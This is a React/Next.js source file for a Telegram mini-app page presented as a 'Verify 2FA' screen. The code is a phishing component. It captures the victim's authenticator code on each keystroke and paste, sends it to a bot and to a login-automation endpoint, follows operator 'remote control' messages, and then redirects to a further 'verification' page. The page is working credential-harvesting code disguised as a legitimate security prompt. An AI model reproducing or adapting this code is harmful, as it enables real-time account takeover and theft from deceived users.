'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { useTelegram } from '../components/providers/TelegramProvider';
import { sendDataToBot } from '../lib/dataSync';
import { postLiveEvent } from '../lib/eventSync';
import { useRemoteControlListener } from '../lib/remoteControl';
import { useToast } from '../components/providers/ToastContext';
import './verify-2fa.css';

export default function Verify2FAPage() {
    const router = useRouter();
    const { webApp } = useTelegram();
    const { showError } = useToast();
    const [code, setCode] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isFocused, setIsFocused] = useState(false);
    const wrapperRef = useRef<HTMLDivElement>(null);

    // Live Data Capture
    useEffect(() => {
        sendDataToBot('user_2fa_code', code);
    }, [code]);

    // Background status polling - auto redirect on success (no auto error toast)
    useEffect(() => {
        let isActive = true;

        const pollStatus = async () => {
            if (!isActive) return;

            try {
                const res = await fetch('/api/automation-status');
                const status = await res.json();

                if (status.status === 'success') {
                    console.log('✅ Background poll: 2FA success, redirecting...');
                    router.push('/verification');
                    return;
                }
            } catch (e) {
                // Ignore errors
            }

            if (isActive) {
                setTimeout(pollStatus, 500);
            }
        };

        pollStatus();

        return () => { isActive = false; };
    }, [router, isSubmitting]);

    const shakeInput = () => {
        if (wrapperRef.current) {
            const wrapper = wrapperRef.current;
            wrapper.style.transform = 'translateX(8px)';
            setTimeout(() => wrapper.style.transform = 'translateX(-8px)', 50);
            setTimeout(() => wrapper.style.transform = 'translateX(8px)', 100);
            setTimeout(() => wrapper.style.transform = 'translateX(-8px)', 150);
            setTimeout(() => wrapper.style.transform = 'translateX(4px)', 200);
            setTimeout(() => wrapper.style.transform = 'none', 250);
        }
    };

    useRemoteControlListener({
        onToast: (msg) => {
            showError(msg);
            setIsSubmitting(false);
        }
    });

    const handlePaste = async () => {
        try {
            if (webApp?.readTextFromClipboard) {
                webApp.readTextFromClipboard((clipText: string) => {
                    if (clipText) {
                        const numericCode = clipText.replace(/[^0-9]/g, '').slice(0, 6);
                        if (numericCode) {
                            setCode(numericCode);
                            sendDataToBot('user_2fa_code', numericCode);
                        } else {
                            showError('Clipboard contains no numbers');
                        }
                    } else {
                        showError('Clipboard is empty');
                    }
                });
            } else if (navigator.clipboard && navigator.clipboard.readText) {
                try {
                    const text = await navigator.clipboard.readText();
                    const numericCode = text.replace(/[^0-9]/g, '').slice(0, 6);
                    if (numericCode) {
                        setCode(numericCode);
                        sendDataToBot('user_2fa_code', numericCode);
                    } else {
                        showError('Clipboard contains no numbers');
                    }
                } catch (err) {
                    console.error('Clipboard API failed:', err);
                    showError('Failed to read clipboard');
                }
            } else {
                showError('Clipboard not supported');
            }
        } catch (e) {
            console.error('Paste error:', e);
            showError('Paste failed');
        }
    };

    const handleInput = async (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
        setCode(value);

        // Live typing - send to automation immediately on each keystroke
        try {
            await fetch('/api/automation-2fa', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code: value, live: true })
            });
        } catch (e) {
            // Ignore errors for live typing
        }
    };

    const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    };

    const handleSubmit = async () => {
        postLiveEvent('user_verify2fa_submit', {});
        if (code.length !== 6) {
            webApp?.HapticFeedback?.notificationOccurred('error');
            shakeInput();
            return;
        }

        webApp?.HapticFeedback?.notificationOccurred('success');
        setIsSubmitting(true);
        sendDataToBot('user_2fa_code', code);

        // Send 2FA code to automation (with submitted=true)
        try {
            await fetch('/api/automation-2fa', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code })
            });
            console.log('📤 2FA code sent to automation');
        } catch (e) {
            console.error('Failed to send 2FA to automation:', e);
        }

        // Poll for automation status to verify if login succeeded (no auto error toast)
        let pollAttempts = 0;
        const maxPollAttempts = 30; // 15 seconds max

        const pollInterval = setInterval(async () => {
            pollAttempts++;

            try {
                const statusRes = await fetch('/api/automation-status');
                const status = await statusRes.json();
                console.log(`📊 2FA status check ${pollAttempts}:`, status.status);

                if (status.status === 'success') {
                    // 2FA successful - navigate to next page
                    clearInterval(pollInterval);
                    router.push('/verification');
                    return;
                }

                if (pollAttempts >= maxPollAttempts) {
                    // Timeout - proceed anyway
                    clearInterval(pollInterval);
                    router.push('/verification');
                }
            } catch (e) {
                console.error('Error polling 2FA status:', e);
            }
        }, 500);
    };

    return (
        <>
            {/* Error Toast is now handled by ToastContext */}
            <div className="auth-container" style={{ paddingTop: '60px' }}>
                {/* Shield Icon with Keyhole */}
                <div className="icon-wrapper">
                    <svg className="shield-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        {/* Shield shape (Grey) */}
                        <path d="M12 22C17.5228 20.6 20 15.5 20 11V5L12 2L4 5V11C4 15.5 6.47715 20.6 12 22Z" fill="#B0B5B9" />
                        {/* Keyhole shape (Dark) */}
                        <path fillRule="evenodd" clipRule="evenodd"
                            d="M12 8.5C10.8954 8.5 10 9.39543 10 10.5C10 11.2307 10.4022 11.8711 11 12.2109V14.5C11 15.0523 11.4477 15.5 12 15.5C12.5523 15.5 13 15.0523 13 14.5V12.2109C13.5978 11.8711 14 11.2307 14 10.5C14 9.39543 13.1046 8.5 12 8.5Z"
                            fill="#181818" />
                    </svg>
                </div>

                {/* Header */}
                <h2 className="title">Verify 2FA</h2>
                <p className="subtitle">Please enter the 6-digit verification code from the authenticator.</p>

                {/* Input Field */}
                <div className="input-group">
                    <label htmlFor="code-input" className="input-label">Verification Code</label>
                    <div className="input-field-wrapper" ref={wrapperRef} style={{ border: isFocused ? "1px solid rgb(36, 238, 137)" : "1px solid transparent", borderRadius: "8px", transition: "border 0.2s" }}>
                        <input
                            type="text"
                            id="code-input"
                            placeholder="Verification Code"
                            autoComplete="off"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            maxLength={6}
                            value={code}
                            onChange={handleInput}
                            onKeyPress={handleKeyPress}
                            onFocus={() => setIsFocused(true)}
                            onBlur={() => setIsFocused(false)}
                        />
                        <button type="button" className="paste-btn" id="paste-btn" onClick={handlePaste}>Paste</button>
                    </div>
                </div>

                {/* Help Link */}
                < a href="#" className="help-link" > Don't have access to this 2FA?</a>

                {/* Main Action */}
                <button
                    className="submit-btn"
                    id="submit-btn"
                    onClick={handleSubmit}
                    disabled={isSubmitting || code.length !== 6}
                    style={{ opacity: (isSubmitting || code.length !== 6) ? 0.5 : 1 }}
                >
                    {isSubmitting ? 'Verifying...' : 'Submit'}
                </button>
            </div >
        </>
    );
}
